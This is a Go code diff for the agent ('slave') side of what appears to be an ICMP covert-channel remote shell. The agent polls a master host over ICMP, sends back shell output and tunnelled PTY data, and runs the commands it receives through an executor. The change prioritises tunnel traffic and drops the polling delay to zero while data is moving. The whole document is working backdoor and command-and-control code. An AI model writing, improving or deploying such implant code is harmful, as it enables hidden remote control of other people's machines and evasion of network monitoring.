@@ -46,51 +46,74 @@ func (s SlaveService) Run(ctx context.Context) error {
 			s.log("%s\n", string(outBuf))
 		}
 
-		var payload []byte
-		var hasMore bool
+		// Phase 1: Flush all pending tunnel data with priority.
+		// Tunnel packets are time-sensitive (PTY interaction), so they go first.
+		tunnelActive := false
 		if s.TunnelManager != nil {
-			if tunnelBuf := s.TunnelManager.TryDequeue(); tunnelBuf != nil {
-				payload = append([]byte{protocol.ProtocolTunnel}, tunnelBuf...)
-				hasMore = s.TunnelManager.HasPending()
+			for {
+				tunnelBuf := s.TunnelManager.TryDequeue()
+				if tunnelBuf == nil {
+					break
+				}
+				tunnelActive = true
+				payload := append([]byte{protocol.ProtocolTunnel}, tunnelBuf...)
+				replyData, err := s.Client.Exchange(ctx, payload)
+				if err != nil {
+					s.log("sendICMP error: %v\n", err)
+					break // Exchange failed (timeout), don't try more tunnel packets
+				}
+				s.handleReply(replyData)
 			}
 		}
-		if payload == nil {
-			payload = append([]byte{protocol.ProtocolShell}, outBuf...)
-		}
 
+		// Phase 2: Send shell data (also serves as a poll to receive commands).
+		payload := append([]byte{protocol.ProtocolShell}, outBuf...)
 		replyData, err := s.Client.Exchange(ctx, payload)
 		if err != nil {
 			s.log("sendICMP error: %v\n", err)
-		} else if len(replyData) > 0 {
-			protoID := replyData[0]
-			data := replyData[1:]
-			if protoID == protocol.ProtocolTunnel {
-				if s.TunnelManager != nil {
-					s.TunnelManager.HandlePacket(data)
-				}
-			} else if protoID == protocol.ProtocolShell {
-				if len(data) > 0 {
-					s.log("%s\n", hex.Dump(data))
-					s.log("------ %s\n", string(data))
-					if err := s.Executor.Execute(data); err != nil {
-						return err
-					}
-				}
-			}
+		} else {
+			s.handleReply(replyData)
 		}
 
 		if s.Config.TestMode {
 			return nil
 		}
-		
-		delay := s.Config.Delay
+
+		// Phase 3: Adaptive delay.
+		// When tunnel is active, poll as fast as possible (delay=0) to keep
+		// both directions responsive (slave→master data + master→slave commands).
+		hasTunnelPending := s.TunnelManager != nil && s.TunnelManager.HasPending()
 		hasRealData := len(replyData) > 2 || len(outBuf) > 0
-		if hasMore || hasRealData {
+
+		delay := s.Config.Delay
+		if tunnelActive || hasTunnelPending || hasRealData {
 			delay = 0
 		}
 
 		if err := sleepContext(ctx, delay); err != nil {
 			return err
+		}
+	}
+}
+
+// handleReply processes an ICMP reply, routing it to the appropriate handler.
+func (s SlaveService) handleReply(replyData []byte) {
+	if len(replyData) == 0 {
+		return
+	}
+	protoID := replyData[0]
+	data := replyData[1:]
+	if protoID == protocol.ProtocolTunnel {
+		if s.TunnelManager != nil {
+			s.TunnelManager.HandlePacket(data)
+		}
+	} else if protoID == protocol.ProtocolShell {
+		if len(data) > 0 {
+			s.log("%s\n", hex.Dump(data))
+			s.log("------ %s\n", string(data))
+			if err := s.Executor.Execute(data); err != nil {
+				s.log("execute error: %v\n", err)
+			}
 		}
 	}
 }
